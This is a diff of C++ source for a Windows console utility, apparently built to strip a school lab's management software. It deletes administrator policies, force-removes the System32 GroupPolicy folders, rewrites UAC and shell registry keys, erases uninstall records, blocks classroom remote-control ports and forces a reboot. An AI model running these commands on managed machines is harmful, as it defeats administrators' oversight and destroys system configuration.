+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DisableTaskMgr");
+                    RegDeleteValueW(hKey, L"DisableRegistryTools");
+                    RegDeleteValueW(hKey, L"DisableCMD");
+                    RegCloseKey(hKey);
+                }
+
+                if (RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"NoContextMenu");
+                    RegDeleteValueW(hKey, L"NoTrayContextMenu");
+                    RegDeleteValueW(hKey, L"NoViewContextMenu");
+                    RegDeleteValueW(hKey, L"NoStartMenu");
+                    RegDeleteValueW(hKey, L"NoTaskbar");
+                    RegCloseKey(hKey);
+                }
+
+                if (RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\Explorer", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"NoContextMenu");
+                    RegDeleteValueW(hKey, L"NoTrayContextMenu");
+                    RegDeleteValueW(hKey, L"NoViewContextMenu");
+                    RegDeleteValueW(hKey, L"NoStartMenu");
+                    RegDeleteValueW(hKey, L"NoTaskbar");
+                    RegCloseKey(hKey);
+                }
+
+                if (RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DisableCMD");
+                    RegCloseKey(hKey);
+                }
+
+                if (RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\System", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DisableCMD");
+                    RegCloseKey(hKey);
+                }
+
+                RegDeleteKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer");
+                RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\Explorer");
+
+                if (RegOpenKeyW(HKEY_CLASSES_ROOT, L"CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\shell", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+
+                if (RegOpenKeyW(HKEY_CLASSES_ROOT, L"CLSID\\{59031A47-3F72-44A7-89C5-5595FE6B30EE}\\shell", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+
+                system("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer\" /f 2>nul");
+                system("reg delete \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Explorer\" /f 2>nul");
+                system("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /f 2>nul");
+                system("reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /f 2>nul");
+
+                system("reg add \"HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\cmd\" /ve /d \"在此处打开命令窗口\" /f 2>nul");
+                system("reg add \"HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\cmd\" /v ShowBasedOnVelocityId /t REG_DWORD /d 639bc8 /f 2>nul");
+
+                system("rd /s /q \"C:\\Windows\\System32\\GroupPolicy\" 2>nul");
+                system("rd /s /q \"C:\\Windows\\System32\\GroupPolicyUsers\" 2>nul");
+                system("rd /s /q \"C:\\Windows\\System32\\GroupPolicy\\Machine\" 2>nul");
+                system("rd /s /q \"C:\\Windows\\System32\\GroupPolicy\\User\" 2>nul");
+
+                system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v Start_TrackProgs /t REG_DWORD /d 1 /f 2>nul");
+                system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v Start_TrackDocs /t REG_DWORD /d 1 /f 2>nul");
+                system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v EnableXamlStartMenu /t REG_DWORD /d 1 /f 2>nul");
+                system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v ShowTaskViewButton /t REG_DWORD /d 1 /f 2>nul");
+
+                system("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Blocked\" /f 2>nul");
+                system("reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Blocked\" /f 2>nul");
+
+                system("reg add \"HKEY_CLASSES_ROOT\\*\\shellex\\ContextMenuHandlers\\Open With\" /ve /d \"{09799AFB-AD67-11d1-ABCD-00C04FC30936}\" /f 2>nul");
+                system("reg add \"HKEY_CLASSES_ROOT\\*\\shellex\\ContextMenuHandlers\\Send To\" /ve /d \"{7BA4C740-9E81-11CF-99D3-00AA004AE837}\" /f 2>nul");
+
+                system("reg add \"HKEY_CLASSES_ROOT\\Directory\\shellex\\ContextMenuHandlers\\Copy To\" /ve /d \"{C2FBB630-2971-11D1-A18C-00C04FD75D13}\" /f 2>nul");
+                system("reg add \"HKEY_CLASSES_ROOT\\Directory\\shellex\\ContextMenuHandlers\\Move To\" /ve /d \"{C2FBB631-2971-11D1-A18C-00C04FD75D13}\" /f 2>nul");
+
+                system("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /f 2>nul");
+                system("reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /f 2>nul");
+                system("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /f 2>nul");
+                system("reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /f 2>nul");
+                system("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableCMD /f 2>nul");
+                system("reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableCMD /f 2>nul");
+
+                Sleep(3000);
+
+                SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_FLUSHNOWAIT, NULL, NULL);
+                SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)L"Environment", SMTO_ABORTIFHUNG, 5000, NULL);
+                SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)L"Policy", SMTO_ABORTIFHUNG, 5000, NULL);
+
+                Sleep(2000);
+
+                std::wcout << L"  [完成] 任务栏和开始菜单右键功能已恢复" << std::endl;
+            }
+
+            std::wcout << L"[额外] 正在修复任务栏Explorer快捷方式..." << std::endl;
+            {
+                HKEY hKey;
+
+                // 修复文件夹打开命令，使用正确的DelegateExecute机制，而不是直接调用explorer.exe
+                if (RegCreateKeyW(HKEY_CLASSES_ROOT, L"Folder\\shell\\open\\command", &hKey) == ERROR_SUCCESS) {
+                    // 删除可能存在的默认值（如果之前被错误设置为explorer.exe）
+                    RegDeleteValueW(hKey, NULL); // 删除默认值
+                    // 设置DelegateExecute
+                    wchar_t delegateClsid[] = L"{11dbb47c-a525-400b-9e80-a54615a090c0}";
+                    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (const BYTE*)delegateClsid, sizeof(delegateClsid));
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_CLASSES_ROOT, L"Folder\\shell\\explore\\command", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, NULL);
+                    wchar_t delegateClsid[] = L"{11dbb47c-a525-400b-9e80-a54615a090c0}";
+                    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (const BYTE*)delegateClsid, sizeof(delegateClsid));
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_CLASSES_ROOT, L"Directory\\shell\\open\\command", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, NULL);
+                    wchar_t delegateClsid[] = L"{11dbb47c-a525-400b-9e80-a54615a090c0}";
+                    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (const BYTE*)delegateClsid, sizeof(delegateClsid));
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_CLASSES_ROOT, L"Drive\\shell\\open\\command", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, NULL);
+                    wchar_t delegateClsid[] = L"{11dbb47c-a525-400b-9e80-a54615a090c0}";
+                    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (const BYTE*)delegateClsid, sizeof(delegateClsid));
+                    RegCloseKey(hKey);
+                }
+
+                // 确保CLSID存在（原始代码中有这一段）
+                if (RegCreateKeyW(HKEY_CLASSES_ROOT, L"CLSID\\{11dbb47c-a525-400b-9e80-a54615a090c0}", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CommandStore\\shell\\Windows.open", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", &hKey) == ERROR_SUCCESS) {
+                    DWORD val = 0;
+                    RegSetValueExW(hKey, L"LaunchTo", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_CLASSES_ROOT, L"lnkfile", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"IsShortcut");
+                    DWORD val = 1;
+                    RegSetValueExW(hKey, L"IsShortcut", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_CLASSES_ROOT, L"piffile", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"IsShortcut");
+                    DWORD val = 1;
+                    RegSetValueExW(hKey, L"IsShortcut", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_CLASSES_ROOT, L"InternetShortcut", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"IsShortcut");
+                    DWORD val = 1;
+                    RegSetValueExW(hKey, L"IsShortcut", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegCloseKey(hKey);
+                }
+
+                std::wcout << L"  [完成] 任务栏Explorer快捷方式已修复" << std::endl;
+            }
+
+            std::wcout << L"[额外] 正在修复UAC设置..." << std::endl;
+            {
+                HKEY hKey;
+
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hKey) == ERROR_SUCCESS) {
+                    DWORD val = 1;
+                    RegSetValueExW(hKey, L"EnableLUA", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegSetValueExW(hKey, L"ConsentPromptBehaviorAdmin", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegSetValueExW(hKey, L"ConsentPromptBehaviorUser", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    val = 0;
+                    RegSetValueExW(hKey, L"PromptOnSecureDesktop", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegDeleteValueW(hKey, L"EnableUIADesktopToggle");
+                    RegDeleteValueW(hKey, L"EnableSecureUIAPaths");
+                    RegDeleteValueW(hKey, L"EnableUIADesktopToggle");
+                    RegDeleteValueW(hKey, L"EnableVirtualization");
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\UIPI", &hKey) == ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"EnableLUA");
+                    RegDeleteValueW(hKey, L"ConsentPromptBehaviorAdmin");
+                    RegDeleteValueW(hKey, L"ConsentPromptBehaviorUser");
+                    RegDeleteValueW(hKey, L"PromptOnSecureDesktop");
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Security Manager", &hKey) == ERROR_SUCCESS) {
+                    DWORD val = 0;
+                    RegSetValueExW(hKey, L"UIAEnable", 0, REG_DWORD, (const BYTE*)&val, 4);
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"NoSmartScreen");
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"EnableSmartScreen");
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"DefaultFileTypeRisk");
+                    RegCloseKey(hKey);
+                }
+
+                if (RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments", &hKey) == ERROR_SUCCESS) {
+                    RegDeleteValueW(hKey, L"SaveZoneInformation");
+                    RegDeleteValueW(hKey, L"HideZoneInfoOnProperties");
+                    RegCloseKey(hKey);
+                }
+
+                system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 1 /f 2>nul");
+                system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f 2>nul");
+                system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorUser /t REG_DWORD /d 3 /f 2>nul");
+
+                std::wcout << L"  [完成] UAC设置已修复" << std::endl;
+            }
+            std::wcout << L"\n=== 基础修复完成 ===" << std::endl;
+            std::wcout << L"\n是否继续修复键盘映射（需要重启）？(Y/N): ";
+            
+            wchar_t confirm;
+            std::wcin >> confirm;
+            if (confirm == L'Y' || confirm == L'y') {
+                std::wcout << L"\n[额外] 正在修复键盘映射和Win键..." << std::endl;
+                {
+                    HKEY hKey;
+                    
+                    if (RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", &hKey) == ERROR_SUCCESS) {
+                        RegDeleteValueW(hKey, L"Scancode Map");
+                        RegDeleteValueW(hKey, L"Extended Scancode Map");
+                        RegCloseKey(hKey);
+                    }
+                    
+                    if (RegOpenKeyW(HKEY_CURRENT_USER, L"Keyboard Layout", &hKey) == ERROR_SUCCESS) {
+                        RegDeleteValueW(hKey, L"Scancode Map");
+                        RegDeleteValueW(hKey, L"Extended Scancode Map");
+                        RegCloseKey(hKey);
+                    }
+                    
+                    if (RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts", &hKey) == ERROR_SUCCESS) {
+                        wchar_t subKeyName[256];
+                        DWORD index = 0;
+                        DWORD nameSize = 256;
+                        
+                        while (RegEnumKeyW(hKey, index, subKeyName, nameSize) == ERROR_SUCCESS) {
+                            HKEY hSubKey;
+                            if (RegOpenKeyW(hKey, subKeyName, &hSubKey) == ERROR_SUCCESS) {
+                                RegDeleteValueW(hSubKey, L"Scancode Map");
+                                RegDeleteValueW(hSubKey, L"Extended Scancode Map");
+                                RegCloseKey(hSubKey);
+                            }
+                            index++;
+                            nameSize = 256;
+                        }
+                        RegCloseKey(hKey);
+                    }
+                    
+                    if (RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hKey) == ERROR_SUCCESS) {
+                        RegDeleteValueW(hKey, L"NoWinKeys");
+                        RegDeleteValueW(hKey, L"NoWinMenu");
+                        RegDeleteValueW(hKey, L"NoWinSelect");
+                        RegCloseKey(hKey);
+                    }
+                    
+                    if (RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hKey) == ERROR_SUCCESS) {
+                        RegDeleteValueW(hKey, L"NoWinKeys");
+                        RegDeleteValueW(hKey, L"NoWinMenu");
+                        RegDeleteValueW(hKey, L"NoWinSelect");
+                        RegCloseKey(hKey);
+                    }
+                    
+                    if (RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", &hKey) == ERROR_SUCCESS) {
+                        DWORD val = 1;
+                        RegSetValueExW(hKey, L"EnableXamlStartMenu", 0, REG_DWORD, (const BYTE*)&val, 4);
+                        RegCloseKey(hKey);
+                    }
+                    
+                    if (RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartPage", &hKey) == ERROR_SUCCESS) {
+                        RegDeleteValueW(hKey, L"StartButtonBypass");
+                        RegCloseKey(hKey);
+                    }
+                    
+                    if (RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowStartMenu", &hKey) == ERROR_SUCCESS) {
+                        RegCloseKey(hKey);
+                    }
+                    
+                    if (RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\Explorer", &hKey) == ERROR_SUCCESS) {
+                        RegDeleteValueW(hKey, L"DisableStartMenu");
+                        RegDeleteValueW(hKey, L"NoStartMenu");
+                        RegCloseKey(hKey);
+                    }
+                    
+                    if (RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer", &hKey) == ERROR_SUCCESS) {
+                        RegDeleteValueW(hKey, L"DisableStartMenu");
+                        RegDeleteValueW(hKey, L"NoStartMenu");
+                        RegCloseKey(hKey);
+                    }
+                    
+                    system("reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout\" /v \"Scancode Map\" /f 2>nul");
+                    system("reg delete \"HKEY_CURRENT_USER\\Keyboard Layout\" /v \"Scancode Map\" /f 2>nul");
+                    system("reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout\" /v \"Extended Scancode Map\" /f 2>nul");
+                    system("reg delete \"HKEY_CURRENT_USER\\Keyboard Layout\" /v \"Extended Scancode Map\" /f 2>nul");
+                    
+                    system("sc config \"kbdclass\" start= demand 2>nul");
+                    system("sc config \"kbdhid\" start= demand 2>nul");
+                    
+                    std::wcout << L"  [完成] 键盘映射和Win键已修复（需要重启生效）" << std::endl;
+                }
+                
+                std::wcout << L"\n正在更新策略..." << std::endl;
+                system("gpupdate /force 2>nul");
+                
+                std::wcout << L"\n=== 完全删除学生机房管理助手完成 ===" << std::endl;
+                std::wcout << L"注意: 键盘映射修复需要重启后生效" << std::endl;
+                std::wcout << L"\n是否立即重启电脑？(Y/N): ";
+                
+                wchar_t confirm2;
+                std::wcin >> confirm2;
+                if (confirm2 == L'Y' || confirm2 == L'y') {
+                    std::wcout << L"正在重启..." << std::endl;
+                    system("shutdown /r /t 3 /f");
+                }
+            } else {
+                std::wcout << L"\n已跳过修复项" << std::endl;
+            }}
+        if (i == 9) {
+            DMSP_VERIFY_INT(0x1009);  // 功能9: 安装信息管理 - 签名验证
+            std::wcout << L"=== 安装信息管理 ===" << std::endl;
+            std::wcout << L"正在扫描已安装的程序..." << std::endl;
+
+            std::vector<std::pair<std::wstring, std::wstring>> installedApps;
+
+            // [修复] 重构注册表枚举逻辑,避免缓冲区溢出/死循环
+            auto scanUninstallKey = [&](HKEY hRoot, const wchar_t* subPath) {
+                HKEY hKey = nullptr;
+                if (RegOpenKeyExW(hRoot, subPath, 0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
+
+                DWORD subKeyCount = 0;
+                if (RegQueryInfoKeyW(hKey, NULL, NULL, NULL, &subKeyCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) {
+                    RegCloseKey(hKey);
+                    return;
+                }
+
+                for (DWORD i = 0; i < subKeyCount; i++) {
+                    // 1. 第一次调用获取子项名长度
+                    wchar_t subKeyName[256] = {};
+                    DWORD subKeyNameLen = 255;
+                    LONG ret = RegEnumKeyExW(hKey, i, subKeyName, &subKeyNameLen, NULL, NULL, NULL, NULL);
+                    if (ret != ERROR_SUCCESS) continue;
+
+                    // 2. 打开子项
+                    HKEY hSubKey = nullptr;
+                    if (RegOpenKeyExW(hKey, subKeyName, 0, KEY_READ, &hSubKey) != ERROR_SUCCESS) continue;
+
+                    // 3. 读取 DisplayName (处理大型字符串)
+                    wchar_t displayName[1024] = {};
+                    DWORD displayNameSize = sizeof(displayName) - sizeof(wchar_t);
+                    if (RegQueryValueExW(hSubKey, L"DisplayName", NULL, NULL, (LPBYTE)displayName, &displayNameSize) == ERROR_SUCCESS) {
+                        // 确保 null 终止
+                        displayName[(displayNameSize / sizeof(wchar_t)) < 1023 ? (displayNameSize / sizeof(wchar_t)) : 1023] = L'\0';
+
+                        // 过滤控制字符(防止显示卡住)
+                        for (DWORD k = 0; k < displayNameSize / sizeof(wchar_t); k++) {
+                            if (displayName[k] < 0x20 && displayName[k] != 0) {
+                                displayName[k] = L'?';
+                            }
+                        }
+
+                        // 4. 读取 DisplayVersion
+                        wchar_t displayVersion[256] = {};
+                        DWORD displayVersionSize = sizeof(displayVersion) - sizeof(wchar_t);
+                        RegQueryValueExW(hSubKey, L"DisplayVersion", NULL, NULL, (LPBYTE)displayVersion, &displayVersionSize);
+                        displayVersion[(displayVersionSize / sizeof(wchar_t)) < 255 ? (displayVersionSize / sizeof(wchar_t)) : 255] = L'\0';
+
+                        // 5. 去重 + 添加
+                        std::wstring nameStr(displayName);
+                        bool isDuplicate = false;
+                        for (const auto& existing : installedApps) {
+                            if (existing.first == nameStr) { isDuplicate = true; break; }
+                        }
+                        if (!isDuplicate) {
+                            installedApps.push_back({nameStr, std::wstring(displayVersion)});
+                        }
+                    }
+                    RegCloseKey(hSubKey);
+                }
+                RegCloseKey(hKey);
+            };
+
+            // 扫描 3 个标准位置
+            scanUninstallKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
+            scanUninstallKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
+            scanUninstallKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
+
+            std::wcout << L"扫描完成,共 " << installedApps.size() << L" 个程序" << std::endl;
+            
+            std::sort(installedApps.begin(), installedApps.end(), [](const auto& a, const auto& b) {
+                return a.first < b.first;
+            });
+
+            installedApps.erase(std::unique(installedApps.begin(), installedApps.end(), [](const auto& a, const auto& b) {
+                return a.first == b.first;
+            }), installedApps.end());
+
+            if (installedApps.empty()) {
+                std::wcout << L"[信息] 未找到已安装的程序" << std::endl;
+            } else {
+                std::wcout << L"\n找到 " << installedApps.size() << L" 个已安装的程序：" << std::endl;
+                std::wcout << L"========================================" << std::endl;
+
+                for (size_t i = 0; i < installedApps.size(); i++) {
+                    wprintf(L"[%zu] %ls", (i + 1), installedApps[i].first.c_str());
+                    if (!installedApps[i].second.empty()) {
+                        wprintf(L" (版本: %ls)", installedApps[i].second.c_str());
+                    }
+                    wprintf(L"\n");
+                    fflush(stdout);  // 强制刷新,避免缓冲卡住
+                }
+
+                wprintf(L"\n请输入要删除安装信息的程序编号（输入0取消）: ");
+                fflush(stdout);
+                int choice = 0;
+
+                // [修复] 兼容 Windows 控制台/PPL 进程的输入
+                char numBuf[16] = {};
+                int numIdx = 0;
+
+                // 用 _getwch() 逐字符读取(同时处理 \r 和 \n 作为回车)
+                int c;
+                while ((c = _getwch()) != WEOF) {
+                    // Windows 控制台: 回车 = \r (13), 部分情况 = \n (10)
+                    if (c == L'\r' || c == L'\n') {
+                        break;  // 确认输入
+                    }
+                    if (c >= L'0' && c <= L'9' && numIdx < 14) {
+                        numBuf[numIdx++] = (char)c;
+                        wprintf(L"%c", c);
+                        fflush(stdout);
+                    } else if ((c == L'\b' || c == 0x7F) && numIdx > 0) {
+                        // 退格或 Delete 键
+                        numBuf[--numIdx] = '\0';
+                        wprintf(L"\b \b");
+                        fflush(stdout);
+                    } else if (c == 0x03) {
+                        // Ctrl+C - 取消
+                        numIdx = 0;
+                        wprintf(L"\n[取消] Ctrl+C 中断\n");
+                        break;
+                    }
+                }
+                wprintf(L"\n");
+                if (numIdx > 0) {
+                    choice = atoi(numBuf);
+                }
+
+                if (choice > 0 && choice <= (int)installedApps.size()) {
+                    std::wstring targetApp = installedApps[choice - 1].first;
+                    std::wcout << L"\n[删除] 正在删除 \"" << targetApp << L"\" 的安装信息..." << std::endl;
+
+                    int deletedCount = 0;
+
+                    // 修复: 改进的删除函数(先收集待删除项,避免索引错乱)
+                    auto deleteFromUninstallKey = [&](HKEY hRoot, const wchar_t* basePath) {
+                        HKEY hUninstallKey;
+                        if (RegOpenKeyExW(hRoot, basePath, 0, KEY_READ | KEY_WRITE, &hUninstallKey) == ERROR_SUCCESS) {
+                            std::vector<std::wstring> toDelete;
+                            wchar_t subKeyName[256];
+                            DWORD index = 0;
+                            DWORD nameSize = 256;
+
+                            // 先收集所有匹配的子项名
+                            while (RegEnumKeyExW(hUninstallKey, index, subKeyName, &nameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
+                                HKEY hSubKey;
+                                if (RegOpenKeyExW(hUninstallKey, subKeyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
+                                    wchar_t displayName[512];
+                                    DWORD displayNameSize = sizeof(displayName);
+
+                                    if (RegQueryValueExW(hSubKey, L"DisplayName", NULL, NULL, (LPBYTE)displayName, &displayNameSize) == ERROR_SUCCESS) {
+                                        if (wcscmp(displayName, targetApp.c_str()) == 0) {
+                                            toDelete.push_back(subKeyName);
+                                        }
+                                    }
+                                    RegCloseKey(hSubKey);
+                                }
+                                index++;
+                                nameSize = 256;
+                            }
+
+                            // 再统一删除(避免索引错乱)
+                            for (const auto& name : toDelete) {
+                                if (RegDeleteKeyW(hUninstallKey, name.c_str()) == ERROR_SUCCESS) {
+                                    std::wcout << L"  [删除] " << name << std::endl;
+                                    deletedCount++;
+                                }
+                            }
+                            RegCloseKey(hUninstallKey);
+                        }
+                    };
+
+                    deleteFromUninstallKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
+                    deleteFromUninstallKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
+                    deleteFromUninstallKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
+
+                    std::wcout << L"\n[完成] 已删除 " << deletedCount << L" 条安装信息" << std::endl;
+                    std::wcout << L"注意: 仅删除了注册表中的安装信息，程序文件可能仍然存在" << std::endl;
+                } else if (choice != 0) {
+                    std::wcout << L"[错误] 无效的编号" << std::endl;
+                } else {
+                    std::wcout << L"[取消] 操作已取消" << std::endl;
+                }
+            }
+        }
+        if (i == 0){
+            DMSP_VERIFY_INT(0x1000);  // 功能0: 退出程序 - 签名验证
+            std::wcout << L"正在清理保护机制..." << std::endl;
+            DisableProtection();
+            AllowUserClose();
+            std::wcout << L"感谢使用，再见！" << std::endl;
+            return 0;
+        }
+        if (i == 10) {
+            DMSP_VERIFY_INT(0x100A);  // 功能10: 垃圾清理 - 签名验证
+            GarbageCleaner::StartCleanup();
+        }
+        if (i == 11) {
+            DMSP_VERIFY_INT(0x100B);  // 功能11: 反远程控制防火墙 - 签名验证
+            if (!CheckZmservAndWarn()) {
+                break;
+            }
+            AntiRemoteControl::ShowMenu();
+        }
+        if (i == 12) {
+            DMSP_VERIFY_INT(0x100C);  // 功能12: 端口监控 - 签名验证
+            PortMonitor::StartPortMonitoring();
+        }
+        if (i == 13) {
+            DMSP_VERIFY_INT(0x100D);  // 功能13: 禁止端口连接 - 签名验证
+            if (!CheckZmservAndWarn()) {
+                break;
+            }
+            PortBlocker::ShowMenu();
+        }
+        if (i == 14) {
+            DMSP_VERIFY_INT(0x100E);  // 功能14: 肃清系统 - 签名验证
+            Feature14Menu();
+        }
+    }
+
+    return 0;
+}
